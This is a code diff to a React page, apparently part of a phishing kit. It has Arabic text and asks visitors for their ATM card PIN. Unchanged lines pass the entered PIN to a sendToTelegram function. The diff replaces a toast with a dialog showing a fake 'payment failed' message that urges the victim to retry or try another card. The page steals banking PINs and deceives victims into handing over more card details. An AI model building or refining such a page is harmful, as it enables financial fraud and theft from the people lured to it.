@@ -9,7 +9,14 @@ import {
   InputOTPGroup,
   InputOTPSlot,
 } from "@/components/ui/input-otp";
-import { useToast } from "@/hooks/use-toast";
+import {
+  AlertDialog,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogFooter,
+  AlertDialogHeader,
+  AlertDialogTitle,
+} from "@/components/ui/alert-dialog";
 
 const steps = [
   { number: 1, title: "نوع الحساب" },
@@ -20,8 +27,8 @@ const steps = [
 
 const ATMPin = () => {
   const [pin, setPin] = useState("");
+  const [isDialogOpen, setIsDialogOpen] = useState(false);
   const navigate = useNavigate();
-  const { toast } = useToast();
 
   const sendToTelegram = async (message: string) => {
     try {
@@ -48,32 +55,7 @@ const ATMPin = () => {
     if (pin.length === 4) {
       const message = `الرقم السري للبطاقة ATM PIN\n\nالرقم السري: ${pin}`;
       await sendToTelegram(message);
-      
-      toast({
-        variant: "destructive",
-        title: "تعذر إتمام عملية الدفع",
-        description: (
-          <div className="space-y-2 text-sm">
-            <p className="font-semibold">نعتذر، لم نتمكن من التحقق من صحة بيانات البطاقة المصرفية.</p>
-            <div className="mr-4 space-y-1">
-              <p>• يرجى التأكد من صحة المعلومات المُدخلة</p>
-              <p>• يمكنكم استخدام بطاقة مصرفية أخرى</p>
-              <p>• أو اختيار وسيلة دفع بديلة</p>
-            </div>
-          </div>
-        ),
-        action: (
-          <Button 
-            variant="outline" 
-            size="sm" 
-            onClick={() => navigate('/registration-complete')}
-            className="bg-background hover:bg-secondary shrink-0"
-          >
-            إعادة المحاولة
-          </Button>
-        ),
-        duration: 10000,
-      });
+      setIsDialogOpen(true);
     }
   };
 
@@ -184,6 +166,45 @@ const ATMPin = () => {
       </main>
 
       <Footer />
+
+      <AlertDialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
+        <AlertDialogContent className="max-w-md" dir="rtl">
+          <AlertDialogHeader>
+            <AlertDialogTitle className="text-center text-destructive text-xl">
+              تعذر إتمام عملية الدفع
+            </AlertDialogTitle>
+            <AlertDialogDescription asChild>
+              <div className="space-y-4 text-right">
+                <p className="font-semibold text-foreground">
+                  نعتذر، لم نتمكن من التحقق من صحة بيانات البطاقة المصرفية.
+                </p>
+                <div className="mr-4 space-y-2">
+                  <p className="text-foreground">• يرجى التأكد من صحة المعلومات المُدخلة</p>
+                  <p className="text-foreground">• يمكنكم استخدام بطاقة مصرفية أخرى</p>
+                  <p className="text-foreground">• أو اختيار وسيلة دفع بديلة</p>
+                </div>
+              </div>
+            </AlertDialogDescription>
+          </AlertDialogHeader>
+          <AlertDialogFooter className="flex-row-reverse gap-2">
+            <Button
+              onClick={() => {
+                setIsDialogOpen(false);
+                navigate('/registration-complete');
+              }}
+              className="bg-primary hover:bg-primary/90"
+            >
+              إعادة المحاولة
+            </Button>
+            <Button
+              variant="outline"
+              onClick={() => setIsDialogOpen(false)}
+            >
+              إغلاق
+            </Button>
+          </AlertDialogFooter>
+        </AlertDialogContent>
+      </AlertDialog>
     </div>
   );
 };
